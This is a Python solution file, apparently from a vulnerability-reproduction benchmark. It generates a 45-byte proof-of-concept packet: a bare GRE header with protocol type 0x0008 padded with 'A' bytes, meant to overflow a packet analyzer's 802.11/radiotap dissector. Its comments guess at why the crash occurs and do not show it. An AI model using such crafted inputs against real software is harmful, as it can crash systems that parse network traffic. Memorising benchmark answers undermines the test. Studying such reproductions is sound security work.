import struct
import subprocess
import tempfile
import os
import tarfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth length is 45 bytes
        # Craft a GRE packet that will trigger the 802.11 dissector
        
        # GRE header structure (RFC 2784):
        # 0-1: Flags and Version
        # 2-3: Protocol Type
        # 4-7: Key (optional)
        # 8-11: Sequence (optional)
        
        # For this vulnerability, we need:
        # 1. Set Protocol Type to 0x0008 (802.11)
        # 2. Provide minimal data that will cause overflow in 802.11 dissector
        
        poc = bytearray()
        
        # GRE Flags and Version
        # C = 0, R = 0, K = 0, S = 0, s = 0, Recur = 0, Flags = 0, Ver = 0
        # This is the minimal header without options
        poc.extend(struct.pack('>H', 0x0000))  # Flags and Version
        
        # Protocol Type: 0x0008 = 802.11
        poc.extend(struct.pack('>H', 0x0008))
        
        # No Key or Sequence fields since flags don't indicate them
        
        # Now add payload that will trigger overflow in 802.11 dissector
        # The 802.11 dissector expects radio tap header but gets GRE flags/version
        # We need to provide enough data to cause stack overflow when dissector
        # tries to parse what it thinks is radio tap header
        
        # Add padding/overflow data
        # 41 bytes of 'A' to reach total 45 bytes (4 + 41)
        # This should overflow any reasonable stack buffer in radio tap parsing
        overflow_data = b'A' * 41
        poc.extend(overflow_data)
        
        return bytes(poc)
